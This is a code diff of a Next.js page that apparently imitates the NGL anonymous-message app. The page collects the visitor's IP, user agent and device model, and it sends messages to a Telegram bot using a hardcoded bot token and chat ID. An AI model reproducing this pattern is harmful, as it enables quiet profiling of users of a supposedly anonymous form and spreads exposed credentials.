@@ -1,11 +1,10 @@
-import Head from "next/head";
 import { useState, useEffect } from "react";
+import Head from "next/head";
 
 export default function NGLPage() {
   const [message, setMessage] = useState("");
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(false);
-  const [error, setError] = useState(false);
   const [userInfo, setUserInfo] = useState({
     ip: "Tidak diketahui",
     userAgent: navigator.userAgent,
@@ -28,33 +27,27 @@ export default function NGLPage() {
       });
   }, []);
 
-  const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
-  const chatId = "1516343905";
-
   const parseDeviceInfo = (userAgent) => {
-    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Realme C11|Samsung|Xiaomi|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry|ZTE|TCL|Alcatel|Microsoft)/i;
+    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Samsung|Xiaomi|Realme|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry)/i;
     const match = userAgent.match(deviceRegex);
-    return match ? match[0].trim() : "Tidak diketahui";
+    if (match) {
+      return match[0].trim();
+    }
+    return "Tidak diketahui";
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-
-    if (!botToken || !chatId) {
-      alert("Token atau Chat ID belum diatur!");
-      return;
-    }
-
-    if (message.trim() === "") {
+    if (!message.trim()) {
       alert("Pesan tidak boleh kosong!");
       return;
     }
-
     setLoading(true);
     setSuccess(false);
-    setError(false);
 
     try {
+      const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
+      const chatId = "1516343905";
       const response = await fetch(
         `https://api.telegram.org/bot${botToken}/sendMessage`,
         {
@@ -67,26 +60,20 @@ export default function NGLPage() {
         }
       );
 
-      const result = await response.json();
       if (response.ok) {
         setMessage("");
         setSuccess(true);
       } else {
-        console.error("Telegram API Error:", result);
-        setError(true);
+        alert("Gagal mengirim pesan. Coba lagi.");
       }
-    } catch (err) {
-      console.error("Error sending message:", err);
-      setError(true);
+    } catch (error) {
+      alert("Terjadi kesalahan. Coba lagi.");
     } finally {
       setLoading(false);
     }
   };
 
-  const closePopup = () => {
-    setSuccess(false);
-    setError(false);
-  };
+  const closePopup = () => setSuccess(false);
 
   return (
     <>
